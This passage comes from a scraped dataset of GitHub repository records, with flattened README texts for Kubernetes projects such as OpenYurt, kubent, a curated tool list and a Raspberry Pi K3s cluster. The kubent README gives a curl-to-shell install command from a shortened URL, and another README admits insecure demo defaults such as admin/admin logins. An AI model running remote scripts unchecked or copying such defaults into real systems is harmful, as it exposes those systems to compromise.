ecosystem grpc gateway protoc gen grpc gateway go install github com grpc ecosystem grpc gateway protoc gen swagger go install google golang org protobuf cmd protoc gen go go install google golang org grpc cmd protoc gen go grpc invoke compile proto Deployment for development bash docker compose f dev docker compose yml up build force recreate To quickly work around CORS during development you could use proxybootstrap https github com romnnn proxybootstrap bash pip install proxybootstrap proxybootstrap port 5000 api http 127 0 0 1 8090 http 127 0 0 1 8080 In this example 8090 is the HTTP service and 8080 is the frontend served via npm You can then access the website at localhost 5000 http localhost 5000 Note This project is still in the alpha stage and should not be considered production ready TODO v2 documentation add images to the readme Fix flaky tests using fuzzy testing and check slappasswd source Implement missing password hashing algorithms Embed crypt 3 as vendored nice to have Implement CLI interface new acc change password add group add member to group list users verify decide on a consistent naming user vs account,2020-08-21T20:14:57Z,2020-09-14T17:49:27Z,Go,User,1,1,0,91,master,romnnn,1,19,22,0,0,0,0
briancain,waypoint-flightlist,automation#aws-eks#bash#cloud#container#docker#example#help#k8s#nomad#waypoint,Waypoint FlightList A repository that helps users reproduce and triage issues with waypoint and the various plugins it supports Inspired by the sandbox dev environment for vagrant https github com briancain congenial octo palm tree Contents kind k8s Uses kind to set up a local k8s cluster with metallb Once set up Waypoint server will be ready to install onto k8s aws eks Follow the HashiCorp Learn guide that uses Terraform to set up aws eks nomad Uses the local nomad dev agent to start up windows work in progress,2020-10-30T21:01:26Z,2020-12-21T16:36:46Z,Shell,User,2,1,1,64,main,briancain,1,0,0,0,0,0,0
DragonV96,easy-cloud,,,2020-11-11T16:34:09Z,2020-12-17T15:12:37Z,Java,User,1,1,1,35,master,DragonV96,1,0,0,0,0,0,0
alibaba,openyurt,cloud-native#edge-computing#golang#k8s#kubernetes,Version https img shields io badge OpenYurt v0 1 0 beta 1 orange CHANGELOG md License https img shields io badge license Apache 202 4EB1BA svg https www apache org licenses LICENSE 2 0 html Go Report Card https goreportcard com badge github com alibaba openyurt https goreportcard com report github com alibaba openyurt Build Status https travis ci org alibaba openyurt svg branch master https travis ci org alibaba openyurt English README zh md notification docs img bell outline badge svg What is NEW August 30th 2020 OpenYurt v0 2 0 is RELEASED Please check the CHANGELOG CHANGELOG md for details May 29th 2020 OpenYurt v0 1 0 beta 1 is RELEASED Please check the CHANGELOG CHANGELOG md for details OpenYurt is built based on native Kubernetes and targets to extend it to support edge computing seamlessly In a nutshell OpenYurt enables users to manage applications that run in the edge infrastructure as if they were running in the cloud infrastructure Our official website is https openyurt io https openyurt io OpenYurt is suitable for common edge computing use cases whose requirements include Minimizing the network traffic over long distances between the devices and the workloads Overcoming the network bandwidth or reliability limitations Processing data remotely to reduce latency Providing a better security model to handle sensitive data OpenYurt has the following advantages in terms of compatibility and usability Kubernetes native It provides full Kubernetes API compatibility All Kubernetes workloads services operators CNI plugins and CSI plugins are supported Seamless conversion It provides a tool to easily convert a native Kubernetes to be edge ready The extra resource and maintenance costs of the OpenYurt components are very low Node autonomy It provides mechanisms to tolerate unstable or disconnected cloud edge networking The applications run in the edge nodes are not affected even if the nodes are offline Cloud platform agnostic OpenYurt can be easily deployed in any public cloud Kubernetes services Architecture OpenYurt follows a classic edge application architecture design a centralized Kubernetes master resides in the cloud site which manages multiple edge nodes reside in the edge site Each edge node has moderate compute resources allowing running a number of edge applications plus the Kubernetes node daemons The edge nodes in a cluster can span multiple physical regions The terms region and unit are interchangeable in OpenYurt The major OpenYurt components consist of YurtHub A node daemon that serves as a proxy for the outbound traffic from the Kubernetes node daemons Kubelet Kubeproxy CNI plugins and so on It caches the states of all the resources that the Kubernetes node daemons might access in the edge node s local storage In case the edge node is offline those daemons can recover the states upon node restarts Yurt controller manager It manages a few controllers such as the node controller and the unit controller to be released for different edge computing use cases For example the Pods in the nodes that are in the autonomy mode will not be evicted from APIServer even if the node heartbeats are missing Yurt tunnel server agent It connects with the TunnelAgent daemon running in each edge node via a reverse proxy to establish a secure network access between the cloud site control plane and the edge nodes that are connected to the intranet Getting started OpenYurt supports Kubernetes versions up to 1 16 Using higher Kubernetes versions may cause compatibility issues You can setup the OpenYurt cluster manually docs tutorial manually setup md but we recommend to start OpenYurt by using the yurtctl command line tool To quickly build and install yurtctl assuming the build system has golang 1 13 and bash installed you can simply do the following bash git clone https github com alibaba openyurt git cd openyurt make WHAT cmd yurtctl The yurtctl binary can be found at output bin To convert an existing Kubernetes cluster to an OpenYurt cluster the following simple command line can be used bash output bin yurtctl convert provider minikube ack To uninstall OpenYurt and revert back to the original Kubernetes cluster settings you can run the following command bash output bin yurtctl revert Please check yurtctl tutorial docs tutorial yurtctl md for more details Usage We provider detailed tutorials docs tutorial README md to demonstrate how to use OpenYurt to manage edge applications Roadmap 2020 Q3 roadmap docs roadmap md Community Contributing If you are willing to be a contributor for OpenYurt project please refer to our CONTRIBUTING CONTRIBUTING md document for details We have also prepared a developer guide docs developer guide md to help the code contributors Meeting Item Value APAC Friendly Community meeting Bi weekly APAC Starting Sep 2 2020 Wednesday 10 00AM GMT 8 https calendar google com calendar cid a3Y3aWQ4MWczcWliMjhkNGFqcXJmMjNwMXNAZ3JvdXAuY2FsZW5kYXIuZ29vZ2xlLmNvbQ Meeting link APAC Friendly meeting https zoom us j 99639193252 Meeting notes Notes and agenda https shimo im docs rGK3cXYWYkPrvWp8 Meeting recordings OpenYurt bilibili Channel https space bilibili com 484245424 video Contact If you have any questions or want to contribute you are welcome to communicate most things via GitHub issues or pull requests Other active communication channels Mailing List openyurt googlegroups com Slack channel https join slack com t openyurt sharedinvite zt iw2lvjzm MxLcBHWm01y1t2fiTD15Gw Dingtalk Group License OpenYurt is under the Apache 2 0 license See the LICENSE LICENSE file for details Certain implementations in OpenYurt rely on the existing code from Kubernetes and the credits go to the original Kubernetes authors,2020-05-21T08:54:43Z,2020-12-29T01:21:26Z,Go,Organization,30,626,118,165,master,rambohe-ch#charleszheng44#Fei-Guo#vincent-pli#Crazy-Kitty#huangyuqi#hwq830#denverdino#kadisi#stormgbs#wenjun93#zyjhtangtang#alibaba-oss#xmwilldo#ESWZY#szihai#carolove#dddddai#lonelymemo#lixin0111#xujunjie-cover,21,2,2,14,33,1,130
tomhuang12,awesome-k8s-resources,awesome-list#kubernetes#kubernetes-resources#list,Awesome Kubernetes Resources Awesome https awesome re badge svg https awesome re A curated list of awesome Kubernetes tools and resources Inspired by awesome https github com sindresorhus awesome list and donnemartin awesome aws https github com donnemartin awesome aws The Fiery Meter of Awesomeness Repo with 0050 Stars fire Repo with 0200 Stars fire fire Repo with 0500 Stars fire fire fire Repo with 1000 Stars fire fire fire fire Repo with 2000 Stars fire fire fire fire fire Idea taken from donnemartin awesome aws https github com donnemartin awesome aws Contents Tools and Libraries tools and libraries Command Line Tools command line tools Cluster Provisioning cluster provisioning Automation and CI CD automation and cicd Cluster Resources Management cluster resources management Secrets Management secrets management Networking networking Storage storage Testing and Troubleshooting testing and troubleshooting Monitoring Alerts and Visualization monitoring alerts and visualization Backup and Restore backup and restore Security and Compliance security and compliance Service Mesh service mesh Development Tools development tools Data Processing and Machine Learning data processing and machine learning Miscellaneous miscellaneous Guides Documentations Blogs and Learnings guides documentations blogs and learnings Guides guides Blogs and Videos blogs and videos Learnings and Documentations learnings and documentations Certification Guides certification guides Contribute contribute License license Tools and Libraries Items with greenheart indicate open source projects Command Line Tools greenheart Helm https github com helm helm fire fire fire fire fire Helm is a tool for managing Charts Charts are packages of pre configured Kubernetes resources greenheart K9s https github com derailed k9s fire fire fire fire fire K9s provides a terminal UI to interact with your Kubernetes clusters greenheart Ktunnel https github com omrikiei ktunnel fire Ktunnel is a CLI tool that establishes a reverse tunnel between a kubernetes cluster and your local machine greenheart Kubebox https github com astefanutti kubebox fire fire fire fire Terminal and Web console for Kubernetes greenheart Kubetail https github com johanhaleby kubetail fire fire fire fire Bash script that enables you to aggregate tail follow logs from multiple pods into one stream greenheart kube shell https github com cloudnativelabs kube shell fire fire fire fire Kube shell An integrated shell for working with the Kubernetes CLI greenheart kubectl tree https github com ahmetb kubectl tree fire fire fire fire A kubectl plugin to explore ownership relationships between Kubernetes objects through owners greenheart kubectl aliases https github com ahmetb kubectl aliases fire fire fire fire This repository contains a script to generate hundreds of convenient shell aliases for kubectl greenheart kubectx kubens https github com ahmetb kubectx fire fire fire fire fire kubectx helps you switch between clusters back and forth and kubens helps you switch between Kubernetes namespaces smoothly greenheart kubediff https github com weaveworks kubediff fire fire fire Kubediff is a tool for Kubernetes to show you the differences between your running configuration and your version controlled configuration greenheart kubeprompt https github com jlesquembre kubeprompt Isolates KUBECONFIG in each shell and shows the current Kubernetes context namespace in your prompt greenheart nova https github com FairwindsOps nova Nova scans your cluster for installed Helm charts then cross checks them against all known Helm repositories greenheart stern https github com wercker stern fire fire fire fire fire Stern allows you to tail multiple pods on Kubernetes and multiple containers within the pod Cluster Provisioning greenheart Bootkube https github com kubernetes sigs bootkube fire fire fire fire Bootkube is a tool for launching self hosted Kubernetes clusters greenheart eksctl https github com weaveworks eksctl fire fire fire fire fire eksctl is a simple CLI tool for creating clusters on EKS Amazon s new managed Kubernetes service for EC2 greenheart k3d https github com rancher k3d fire fire fire fire k3d and Windows destroy half the memory highly available is a tool for running local k3s clusters in docker It s a single binary about 20 MB You need to have docker installed greenheart k3s https github com rancher k3s fire fire fire fire fire Lightweight Kubernetes Easy to install Kubernetes clusters from the command line greenheart kind https github com kubernetes sigs kind fire fire fire fire fire kind is a tool for running local Kubernetes clusters using Docker container nodes greenheart kops https github com kubernetes kops fire fire fire fire fire kops helps you create like kind upgrade and maintain production grade greenheart kube aws https github com kubernetes incubator kube aws fire fire fire fire kube aws is a command line tool to create update destroy Kubernetes clusters on AWS greenheart kubespray https github com kubernetes sigs kubespray fire fire fire fire fire Deploy a production ready Kubernetes cluster greenheart Minikube https github com kubernetes minikube fire fire fire fire fire minikube implements a local Kubernetes cluster on macOS Linux all in a binary less than 100 MB Kubeadm https kubernetes io docs reference setup tools kubeadm kubeadm kubeadm performs the actions necessary to get a minimum viable cluster up and running Automation and CI CD greenheart Apollo https github com logzio apollo fire fire Apollo is a simple lightweight Continuous Deployment CD solution on top of Kubernetes greenheart Argo CD https github com argoproj argo cd fire fire fire fire fire Argo CD is a declarative GitOps continuous delivery tool for Kubernetes greenheart Argo Events https github com argoproj argo events fire fire fire Argo Events is an event driven workflow automation framework for Kubernetes which helps you trigger K8s objects Argo Workflows Serverless workloads etc greenheart Argo Rollouts https github com argoproj argo rollouts fire fire fire Argo Rollouts controller uses the Rollout custom resource to provide additional deployment strategies such as Blue Green and Canary to Kubernetes greenheart Argo Workflows https github com argoproj argo fire fire fire fire fire Argo Workflows is an open source container native workflow engine for orchestrating parallel jobs on Kubernetes Codefresh https codefresh io Codefresh is a Docker native CI CD platform Instantly build test and deploy Docker images to Kubernetes greenheart Flagger https github com weaveworks flagger fire fire fire fire fire Flagger is a progressive delivery tool that automates the release process for applications running on Kubernetes greenheart Flux https github com fluxcd flux fire fire fire fire fire Flux is a tool that automatically ensures that the state of a cluster matches the config in git greenheart Flux2 https github com fluxcd flux2 fire fire fire Flux version 2 is built from the ground up to use Kubernetes API extension system and to integrate with Prometheus and other core components of the Kubernetes ecosystem greenheart Helm Operator https github com fluxcd helm operator fire fire The Helm Operator is a Kubernetes operator allowing one to declaratively manage Helm chart releases greenheart KEDA https github com kedacore keda fire fire fire fire fire KEDA allows for fine grained autoscaling including to from zero for event driven Kubernetes workloads greenheart KubeSphere https github com kubesphere kubesphere fire fire fire fire fire KubeSphere is a distributed operating system providing cloud native stack with Kubernetes as its kernel and aims to be plug and play architecture for third party applications seamless integration to boost its ecosystem greenheart Reloader https github com stakater Reloader fire fire fire fire Reloader can watch changes in ConfigMap and Secret and do rolling upgrades on Pods with their associated DeploymentConfigs Deployments Daemonsets and Statefulsets greenheart Skaffold https github com GoogleContainerTools skaffold fire fire fire fire fire Skaffold is a command line tool that facilitates continuous development for Kubernetes applications greenheart Spinnaker https github com spinnaker spinnaker fire fire fire fire fire Spinnaker is an open source continuous delivery platform for releasing software changes with high velocity and confidence Cluster Resources Management greenheart Grafana Tanka https github com grafana tanka fire fire fire The clean concise and super flexible alternative to YAML for your Kubernetes cluster greenheart Kruise https github com openkruise kruise fire fire fire fire Kruise consists of several controllers which extend and complement the Kubernetes core controllers for workload management greenheart KubeDirector https github com bluek8s kubedirector fire fire KubeDirector uses standard Kubernetes K8s facilities of custom resources and API extensions to implement stateful scaleout application clusters greenheart Kubenav https github com kubenav kubenav fire fire fire kubenav is the navigator for your Kubernetes clusters right in your pocket greenheart Liqo https github com liqotech liqo fire Liqo implements Dynamic resource sharing across different Kubernetes clusters e g offloading pods and services supporting decentralized governance greenheart The Hierarchical Namespace Controller https github com kubernetes sigs multi tenancy tree master incubator hnc fire fire fire Hierarchical namespaces make it easier to share your cluster by making namespaces more powerful Secrets Management greenheart Kubernetes External Secrets https github com godaddy kubernetes external secrets fire fire fire Kubernetes External Secrets allows you to use external secret management systems like AWS Secrets Manager or HashiCorp Vault to securely add secrets in Kubernetes greenheart Sealed Secrets https github com bitnami labs sealed secrets fire fire fire fire fire Encrypt your Secret into a SealedSecret which is safe to store even to a public repository Networking greenheart Calico Networking https github com projectcalico calico fire fire fire fire Calico is an open source networking and network security solution for containers virtual machines and bare metal workloads greenheart cert manager https github com jetstack cert manager fire fire fire fire fire cert manager is a Kubernetes add on to automate the management and issuance of TLS certificates from various issuing sources greenheart CoreDNS https github com coredns coredns fire fire fire fire fire CoreDNS is a fast and flexible DNS server that works on Kubernetes greenheart ingress nginx https github com kubernetes ingress nginx fire fire fire fire fire ingress nginx is an Ingress controller for Kubernetes using NGINX as a reverse proxy and load balancer greenheart Kong for Kubernetes https github com Kong kubernetes ingress controller fire fire fire fire Configure plugins health checking load balancing and more in Kong for Kubernetes Services greenheart ksniff https github com eldadru ksniff fire fire fire A kubectl plugin that utilize tcpdump and Wireshark to start a remote capture on any pod in your Kubernetes cluster greenheart kubectl trace https github com iovisor kubectl trace fire fire fire kubectl trace is a kubectl plugin that allows you to schedule the execution of bpftrace programs in your Kubernetes cluster greenheart kubernetes ingress https github com nginxinc kubernetes ingress fire fire fire fire fire An implementation of an Ingress controller for NGINX and NGINX Plus commercial Storage greenheart Longhorn https github com longhorn longhorn fire fire fire fire Longhorn is a distributed block storage system for Kubernetes greenheart OpenEBS https github com openebs openebs fire fire fire fire fire OpenEBS is the most widely deployed and easy to use open source storage solution for Kubernetes greenheart Rook https github com rook rook fire fire fire fire fire Rook is an open source cloud native storage orchestrator for Kubernetes Amazon EBS CSI Driver https github com kubernetes sigs aws ebs csi driver The Amazon Elastic Block Store Container Storage Interface CSI Driver provides a CSI interface used by Container Orchestrators to manage the lifecycle of Amazon EBS volumes Amazon EFS CSI Driver https github com kubernetes sigs aws efs csi driver The Amazon Elastic File System Container Storage Interface CSI Driver implements the CSI specification for container orchestrators to manage the lifecycle of Amazon EFS filesystems Amazon FSx for Lustre CSI Driver https github com kubernetes sigs aws fsx csi driver The Amazon FSx for Lustre Container Storage Interface CSI Driver implements CSI specification for container orchestrators CO to manage lifecycle of Amazon FSx for Lustre filesystems Testing and Troubleshooting greenheart Chaos Mesh https github com pingcap chaos mesh fire fire fire fire Chaos Mesh is a cloud native Chaos Engineering platform that orchestrates chaos on Kubernetes environments greenheart chaoskube https github com linki chaoskube fire fire fire fire chaoskube periodically kills random pods in your Kubernetes cluster greenheart Conftest https github com open policy agent conftest fire fire fire fire Conftest helps you write tests against structured configuration data greenheart Cooper https github com cloud66 oss copper fire fire A configuration file validator for Kubernetes This is specifically useful with Kubernetes configuration files to enforce best practices apply policies and compliance requirements greenheart k6 https github com loadimpact k6 fire fire fire fire fire k6 is a modern load testing tool building on Load Impact s years of experience in the load and performance testing industry greenheart ksniff https github com eldadru ksniff fire fire fire A kubectl plugin that utilize tcpdump and Wireshark to start a remote capture on any pod in your Kubernetes cluster greenheart Kube DOOM https github com storax kubedoom fire fire fire fire The next level of chaos engineering is here Kill pods inside your Kubernetes cluster by shooting them in Doom greenheart kube monkey https github com asobti kube monkey fire fire fire fire It randomly deletes Kubernetes k8s pods in the cluster encouraging and validating the development of failure resilient services greenheart kube score https github com zegl kube score fire fire fire kube score is a tool that performs static code analysis of your Kubernetes object definitions greenheart Kubectl debug https github com aylei kubectl debug fire fire fire fire kubectl debug is an out of tree solution for troubleshooting running pods which allows you to run a new container in running pods for debugging purpose greenheart KubeInvaders https github com lucky sideburn KubeInvaders fire fire fire Through KubeInvaders you can stress Kubernetes cluster in a fun way and check how it is resilient greenheart Kubetest https github com vapor ware kubetest fire Kubet,2020-07-05T23:05:06Z,2020-12-28T16:26:54Z,n/a,User,29,430,53,117,main,tomhuang12#Kasia66#izzatzr#walidshaari#palexster#bgulla#eyarz#jeanguirro#louiznk#normalfaults#svmaris,11,0,0,4,1,3,39
geerlingguy,turing-pi-cluster,cluster#compute-module#k3s#k8s#kubernetes#raspberry-pi#turing-pi,Turing Pi Cluster 7 node K3s Raspberry Pi Cluster CI https github com geerlingguy turing pi cluster workflows CI badge svg branch master event push https github com geerlingguy turing pi cluster actions query workflow 3ACI This repository is a companion to a YouTube series by Jeff Geerling in 2020 Episode 1 Introduction to Clustering https www youtube com watch v kgVz4 SEhbE blog post https www jeffgeerling com blog 2020 raspberry pi cluster episode 1 introduction clusters Episode 2 Setting up the Cluster https www youtube com watch v xNndbfxMCLo blog post https www jeffgeerling com blog 2020 raspberry pi cluster episode 2 setting cluster Episode 3 Installing K3s on the Turing Pi https www youtube com watch v N4bfNefjBSw blog post https www jeffgeerling com blog 2020 pi cluster episode 3 installing k3s kubernetes on turing pi Episode 4 Minecraft Pi hole Grafana MORE https www youtube com watch v IafVCHkJbtI blog post https www jeffgeerling com blog 2020 raspberry pi cluster episode 4 minecraft pi hole grafana and more Episode 5 Benchmarking the Turing Pi https www youtube com watch v IoMxpndlDWI blog post https www jeffgeerling com blog 2020 raspberry pi cluster episode 5 benchmarking turing pi Episode 6 Turing Pi Review https www youtube com watch v aApByQWqnV0 blog post https www jeffgeerling com blog 2020 raspberry pi cluster episode 6 turing pi review You might also be interested in another Raspberry Pi cluster I ve maintained for years the Raspberry Pi Dramble https www pidramble com which is a Kubernetes Pi cluster in my basement that hosts www pidramble com https www pidramble com Compatibility This cluster configuration has been tested with the following Raspberry Pi and OS combinations Raspberry Pi 4 model B and HypriotOS Raspberry Pi 4 model B and Raspberry Pi OS 32 bit Raspberry Pi 4 model B and Raspberry Pi OS 64 bit Raspberry Pi Compute Module 3 and HypriotOS Other models of Raspberry Pi and Compute Modules may or may not work but the main thing you need is a cluster with at least 7 GB of RAM and at least 12 available CPU cores every current Pi has 4 CPU cores otherwise not all of the software will be able to run well This configuration will definitely not run on the Pi Zero or on Pis older than the Raspberry Pi 2 model B Usage First you need to make sure you have K3s running on your Pi cluster Instructions for doing so are in Episodes 2 and 3 linked above When you run the K3s Ansible playbook make sure you have extraserverargs node taint k3s controlplane true NoExecute in your K3s groupvars all yml so pods are not scheduled on the master node and that all your nodes have unique hostnames e g on Pi OS run sudo hostnamectl set hostname worker 01 to set a Pi to worker 01 Then you can deploy all the applications configured in this repository with the main yml playbook 1 Make sure you have Ansible https docs ansible com ansible latest installationguide introinstallation html installed 2 Install Ansible requirements ansible galaxy role install r requirements yml ansible galaxy collection install r requirements yml These commands can be consolidated into one ansible galaxy install command once Ansible 2 10 is released 3 Copy the example hosts ini inventory file to hosts ini Make sure it has the master and node s configured correctly 4 Edit the ingressserverip and loadbalancerserverip in groupvars all yml and set them each to an IP address of one of the nodes Change any other variables in that file as necessary 5 Run the playbook ansible playbook main yml Once that s done there will be variety of applications running on your cluster for example Software Address Notes Prometheus http prometheus 10 0 100 74 nip io N A AlertManager http alertmanager 10 0 100 74 nip io N A Grafana http grafana 10 0 100 74 nip io Default login is admin admin Drupal http drupal 10 0 100 74 nip io N A Wordpress http wordpress 10 0 100 74 nip io N A Minecraft kubectl get service n minecraft See EULA in Minecraft chart repo https github com helm charts tree master stable minecraft Pi hole http pi hole See pihole role README roles pihole README md The exact URLs will vary in your cluster refer to the output of the Ansible playbook which lists each service s exact URL Caveats They are a plenty First of all the configurations in this repository were built for local demonstration purposes There are some things that are insecure like storing some database passwords in plain text and other things that are just plain crazy like trying to run all the above things on one tiny Pi based cluster There are a few architectural decisions that were made that are great for day one setup but if you tried to flex K3s muscle and drop replace nodes while the cluster is running you d likely start running into some shall we say fun problems For example the MariaDB PVCs are tied to the local node on which they were first deployed and if you do something that results in the MariaDB Deployment to change nodes for the deployed Pod you may run into warnings like FailedScheduling 3 node s had volume node affinity conflict Therefore if you want to use this project as a base and are planning on doing anything more than a local demo cluster you are responsible for making changes to support a more production ready setup with better security and better configuration of persistent volumes and multi pod scalability To do these things correctly with Kubernetes takes a lot of work It s usually very easymaybe deceptively easyto get something working It s harder to get it working reliably in an automated fashion when rebuilding the cluster from scratch that s about the level where this repository is And harder still is getting it working reliably with easy maintenance fault tolerance and scalability Kubernetes is no substitute for a thorough knowledge of system architecture and engineering Resetting the cluster You ll likely want to blow away all the changes you ve made in a cluster and start fresh every now and then If you made a mistake or something broke terribly that problem goes away Or if you want to make sure you ve automated the entire cluster build properly it s best practice to rebuild a cluster frequently Regardless of the reason here s how to quickly wipe the cluster clean without re flashing all the Raspberry Pis from scratch 1 In the k3s ansible repository directory which you used to set up the cluster run ansible playbook i inventory hosts ini reset yml This command will likely have a few failures relating to files that can t be cleaned up until after a reboot 2 Reboot the Raspberry Pis in the same directory ansible i inventory hosts ini all m reboot b 3 Run the reset playbook a second time to clean up the stragglers ansible playbook i inventory hosts ini reset yml 4 Re install K3s on the cluster ansible playbook i inventory hosts ini site yml Now you can go back to the steps above under Usage to set up applications inside the cluster Important note Any files that were downloaded for this repository like the monitoring repository still exist in the pirate HypriotOS or pi Raspberry Pi OS user s home directory For a more complete reset also delete all those files and directories Or to go thermonuclear re flash all the Pi s eMMC or microSD cards Author The repository was created in 2020 by Jeff Geerling https www jeffgeerling com who writes Ansible for DevOps https www ansiblefordevops com and Ansible for Kubernetes https www ansibleforkubernetes com,2020-05-21T19:20:45Z,2020-12-28T03:32:15Z,HTML,User,25,195,28,51,master,geerlingguy,1,0,4,1,21,1,7
doitintl,kube-no-trouble,gke#hacktoberfest#k8s#kube#kubernetes,Kube No Trouble kubent Easily check your cluster for use of deprecated APIs Kubernetes 1 16 is slowly starting to roll out not only across various managed Kubernetes offerings and with that come a lot of API deprecations 1 1 Kube No Trouble kubent is a simple tool to check whether you re using any of these API versions in your cluster and therefore should upgrade your workloads first before upgrading your Kubernetes cluster This tool will be able to detect deprecated APIs depending on how you deploy your resources as we need the original manifest to be stored somewhere In particular following tools are supported file local manifests in YAML or JSON kubectl uses the kubectl kubernetes io last applied configuration annotation Helm v2 uses Tiller manifests stored in K8s Secrets or ConfigMaps Helm v3 uses Helm manifests stored as Secrets or ConfigMaps directly in individual namespaces 1 https kubernetes io blog 2019 07 18 api deprecations in 1 16 Additional resources Blog post on K8s deprecated APIs and introduction of kubent Kubernetes How to automatically detect and deal with deprecated APIs 2 2 https blog doit intl com kubernetes how to automatically detect and deal with deprecated apis f9a8fc23444c Install Run sh c curl sSL https git io install kubent The script will download latest version and unpack to usr local bin Or download the latest release https github com doitintl kube no trouble releases latest for your platform and unpack manually Usage Configure Kubectl s current context to point to your cluster kubent will look for the kube config file in standard locations you can point it to custom location using the k switch kubent will collect resources from your cluster and report on found issuses Please note that you need to have sufficient permissions to read Secrets in the cluster in order to use Helm collectors sh kubent 6 25PM INF Kube No Trouble kubent 6 25PM INF Initializing collectors and retrieving data 6 25PM INF Retrieved 103 resources from collector name Cluster 6 25PM INF Retrieved 132 resources from collector name Helm v2 6 25PM INF Retrieved 0 resources from collector name Helm v3 6 25PM INF Loaded ruleset name deprecated 1 16 rego 6 25PM INF Loaded ruleset name deprecated 1 20 rego 1 16 Deprecated APIs KIND NAMESPACE NAME APIVERSION Deployment default nginx deployment old apps v1beta1 Deployment kube system event exporter v0 2 5 apps v1beta1 Deployment kube system k8s snapshots extensions v1beta1 Deployment kube system kube dns extensions v1beta1 1 20 Deprecated APIs KIND NAMESPACE NAME APIVERSION Ingress default test ingress extensions v1beta1 Arguments You can list all the configuration options available using help switch sh kubent h Usage of kubent c cluster enable Cluster collector default true d debug enable debug logging e exit error exit with non zero code when issues are found f filename strings manifests to check helm2 enable Helm v2 collector default true helm3 enable Helm v3 collector default true k kubeconfig string path to the kubeconfig file default Users stepan kube config o output string output format text json default text Use in CI kubent will by default return 0 exit code if the program succeeds even if it finds deprecated resources and non zero exit code if there is an error during runtime Because all info output goes to stderr it s easy to check in shell if any issues were found shell test z kubent if stdout output is empty means no issuse were found equivalent to z kubent It s actually better so split this into two steps in order to differentiate between runtime error and found issues shell if OUTPUT kubent then check for non zero return code first echo kubent failed to run elif n OUTPUT then check for empty stdout echo Deprecated resources found fi You can also use exit error e flag which will make kubent to exit with non zero return code 200 in case any issues are found Alternatively use the json output and smth like jq to check if the result is empty kubent o json jq e length 0 Development The simplest way to build kubent is sh Clone the repository git clone https github com doitintl kube no trouble git cd kube no trouble We require statik for generating static embedded files go get github com rakyll statik Generate go generate Build go build o bin kubent cmd kubent main go Otherwise there s Makefile sh make make all Cean build and pack help Prints list of tasks build Build binary generate Go generate pack Pack binaries with upx release artifacts Create release artifacts clean Clean build artifacts Commit messages We enforce simple version of Conventional Commits cc in the form optional body optional footer s Where type is one of build Affects build and or build system chore Other non functional changes ci Affects CI e g GitHub actions dep Dependency update docs Documentation only change feat A new feature fix A bug fix ref Code refactoring without functinality change style Formatting changes test Adding changing tests cc https www conventionalcommits org Use imperative present tense Add not Added capitalize first letter of summary no dot at the and The body and footer are optional Relevant GitHub issues should be referenced in the footer in the form Fixes 123 fixes 456 Changelog Changelog is generated automatically based on merged PRs using changelog gen chlg gen Template can be found in scripts changelog tmpl PRs are categorized based on their labels into following sections Announcements announcement label Breaking Changes breaking change label Features feature label Changes change label Fixes fix label Internal Other everything else PR can be excluded from changelog with no release note label PR title is used by default however the copy can be customized by including following block in the PR body release note This is an example release note chlg gen https github com paultyng changelog gen Issues and Contributions Please open any issues and or PRs against github com doitintl kube no trouble repository Feedback and contributions are always welcome,2020-04-08T17:55:01Z,2020-12-28T13:55:29Z,Go,Organization,7,191,6,138,master,stepanstipl#david-doit-intl#dependabot[bot]#manute,4,10,10,13,16,2,55
cloudogu,k8s-diagrams,authc#authn#container#deployment#k8s#kubernetes#node#pod#podsecuritypolicies#psp#rbac#security,k8s diagrams A collection of diagrams explaining kubernetes extracted from our trainings https cloudogu com en trainings articles https cloudogu com en blog tag k8s security and talks k8s sec https github com cloudogu k8s appops security talks k8s intro https github com cloudogu k8s intro talk The diagrams are realized using PlantUML https plantuml com so they re basically text and can be adjusted easily Note that the diagrams don t use UML notation They are rather box and line diagrams Table of contents Deployment Pod Container deployment E2 9E 9C pod E2 9E 9C container Pod Node pod E2 9E 9C node Services Nodes and Pods explained services nodes and pods explained Services Nodes and Pods explained including IP addresses services nodes and pods explained including ip addresses Ingresses explained ingresses explained Rolling Updates explained rolling updates explained Authentication and Authorization authentication and authorization Role Based Access Control RBAC Resources role based access control rbac resources PodSecurityPolicy Activation via RBAC podsecuritypolicy activation via rbac Troubleshooting Kubernetes PodSecurityPolicies troubleshooting kubernetes podsecuritypolicies GitOps gitops High level overview high level overview Details details Deployment Pod Container Relationship between Deployment Pod and Container Simplified leaves out ReplicaSets for brevity https www plantuml com plantuml proxy src https raw githubusercontent com cloudogu k8s diagrams master diagrams deploy pod container puml fmt svg Pod Node Relationship between Pod and Node https www plantuml com plantuml proxy src https raw githubusercontent com cloudogu k8s diagrams master diagrams pod node puml fmt svg Services Nodes and Pods explained Traffic flow from Cloud LoadBalancer via Service to Pods running on Nodes https www plantuml com plantuml proxy src https raw githubusercontent com cloudogu k8s diagrams master diagrams services puml fmt svg Services Nodes and Pods explained including IP addresses Traffic flow from Cloud LoadBalancer via Service to Pods running on Nodes Including different address IP address ranges and ports external IP node internal and external IP and node port service IP pod IP and target port on container https www plantuml com plantuml proxy src https raw githubusercontent com cloudogu k8s diagrams master diagrams services with ip puml fmt svg Ingresses explained Progress of a requests from the ingress controller s service to the actual pod illustrating the role of the ingress resource https www plantuml com plantuml proxy src https raw githubusercontent com cloudogu k8s diagrams master diagrams ingress puml fmt svg Rolling Updates explained https www plantuml com plantuml proxy src https raw githubusercontent com cloudogu k8s diagrams master diagrams rolling update puml fmt svg Authentication and Authorization Flow from user API server request to response check authn via identity provider then authz via RBAC https www plantuml com plantuml proxy src https raw githubusercontent com cloudogu k8s diagrams master diagrams k8s auth puml fmt svg Role Based Access Control RBAC Resources A simplified display of resources involved in RBAC and their correlations Note that Permission is not a k8s resource but a list of rules inside the Cluster roles that make up a kind of permission It consits of resources and verbs granted on it For example resources secrets verbs get Subject can be a serviceAccount user or group https www plantuml com plantuml proxy src https raw githubusercontent com cloudogu k8s diagrams master diagrams rbac puml fmt svg PodSecurityPolicy Activation via RBAC Connection from Pod to PSP via RBAC Role RoleBinding ServiceAccount https www plantuml com plantuml proxy src https raw githubusercontent com cloudogu k8s diagrams master diagrams psp rbac puml fmt svg Troubleshooting Kubernetes PodSecurityPolicies A diagram to help debugging Kubernetes PodSecurityPolicies https www plantuml com plantuml proxy src https raw githubusercontent com cloudogu k8s diagrams master diagrams troubleshooting k8s psps puml fmt svg GitOps Diagrams describing the general concepts of gitOps and distinguishing it from ciOps See also our GitOps playground https github com cloudogu k8s gitops playground to experience argocd and flux hands on in a local k8s cluster GitOps glossary https cloudogu com en glossary gitops and offerings for consulting https cloudogu com en consulting High level overview https www plantuml com plantuml proxy src https raw githubusercontent com cloudogu k8s diagrams master diagrams ciops puml fmt svg https www plantuml com plantuml 